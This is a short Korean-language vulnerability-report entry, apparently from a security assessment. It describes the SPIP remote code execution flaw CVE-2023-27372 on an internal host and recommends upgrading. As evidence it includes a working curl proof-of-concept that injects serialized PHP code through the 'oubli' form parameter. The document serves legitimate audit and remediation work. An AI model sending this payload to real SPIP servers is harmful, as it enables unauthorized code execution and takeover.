## SPIP - Remote Command Execution
- **End-Point**: `http://10.67.128.251//spip/spip.php`
- **영향**: 공격자가 대상 시스템에서 임의의 명령을 실행하여 시스템 권한을 탈취하거나 제어할 수 있음.
- **설명**: 4.2.1 이전 버전의 SPIP에서 공개 영역의 폼 값 처리 시 직렬화(serialization) 미흡으로 인해 발생하는 원격 코드 실행(RCE) 취약점(CVE-2023-27372)임.
- **근거**: `oubli` 파라미터에 PHP 코드가 포함된 직렬화 데이터를 삽입하여 전송하는 재현 코드 확인: `curl -X 'POST' -d 'page=spip_pass&formulaire_action=oubli&formulaire_action_args=AKXEs4U6r36PZ5LnRZXtHvxQ/ZZYCXnJB2crlmVwgtlVVXwXn/MCLPMydXPZCL/WsMlnvbq2xARLr6toNbdfE/YV7egygXhx&oubli=s:19:"<?php phpinfo(); ?>";' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Host: 10.67.128.251' -H 'User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; sv-SE) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4' 'http://10.67.128.251//spip/spip.php?page=spip_pass'`
- **대응**: 취약점이 해결된 공식 보안 패치 버전을 적용함.
- **조치**: SPIP 버전을 3.2.18, 4.0.10, 4.1.8, 4.2.1 또는 그 이상의 최신 버전으로 업그레이드할 것을 권고함.
